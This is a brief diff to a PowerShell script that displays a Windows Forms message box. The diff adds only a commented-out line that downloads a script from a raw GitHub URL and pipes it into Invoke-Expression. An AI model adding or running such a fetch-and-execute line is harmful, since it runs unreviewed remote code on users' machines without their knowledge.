@@ -7,3 +7,6 @@ Add-Type -AssemblyName System.Windows.Forms
     [System.Windows.Forms.MessageBoxButtons]::OK,
     [System.Windows.Forms.MessageBoxIcon]::Information
 )
+
+
+# irm -Uri https://raw.githubusercontent.com/itsverycoolbs/verycoolprogramforsure/refs/heads/main/test.ps1 | iex
